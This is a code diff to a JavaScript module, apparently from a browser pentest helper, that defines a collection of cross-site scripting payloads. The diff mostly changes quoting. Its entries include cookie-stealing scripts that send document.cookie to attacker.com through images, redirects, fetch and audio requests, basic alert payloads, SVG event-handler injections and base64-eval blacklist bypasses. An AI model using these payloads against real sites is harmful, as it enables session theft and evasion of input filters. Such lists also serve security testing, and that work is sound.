@@ -5,18 +5,16 @@ import { utilsProxy as utils } from './vk-namespace.js';
 
 const XSS_DATA = {
   'Cookie 窃取': [
-    `<scr` +
-      `ipt>new Image().src="http://attacker.com/steal.php?cookie="+${document.cookie};</scr` +
-      `ipt>`,
-    `<scr` +
-      `ipt>document.location='http://attacker.com/steal.php?cookie='+${document.cookie};</scr` +
-      `ipt>`,
-    `<scr` +
-      `ipt>fetch('http://attacker.com',{method:'POST',body:${document.cookie}});</scr` +
-      `ipt>`,
-    `<scr` +
-      `ipt>new Audio("http://attacker.com/steal.php?cookie="+${document.cookie});</scr` +
-      `ipt>`,
+    '<scr' +
+      'ipt>new Image().src="http://attacker.com/steal.php?cookie="+document.cookie;</scr' +
+      'ipt>',
+    '<scr' +
+      "ipt>document.location='http://attacker.com/steal.php?cookie='+document.cookie;</scr" +
+      'ipt>',
+    '<scr' + "ipt>fetch('http://attacker.com',{method:'POST',body:document.cookie});</scr" + 'ipt>',
+    '<scr' +
+      'ipt>new Audio("http://attacker.com/steal.php?cookie="+document.cookie);</scr' +
+      'ipt>',
   ],
   '基础 XSS': [
     "<script>alert('XSS')</script>",
@@ -46,7 +44,7 @@ const XSS_DATA = {
     "<svg><animate onbegin=alert('XSS') attributeName=x dur=1s>",
     "<svg><set onmouseover=alert('XSS') attributeName=onmouseover to=alert(1)>",
   ],
-  '绕过黑名单': [
+  绕过黑名单: [
     `<script>eval(atob('YWxlcnQoJ1hTUycp'));<\/script>`,
     `<script>Function(atob('YWxlcnQoJ1hTUycp'))();<\/script>`,
     `<script>['alert'].forEach(function(f){window[f]('XSS')});<\/script>`,
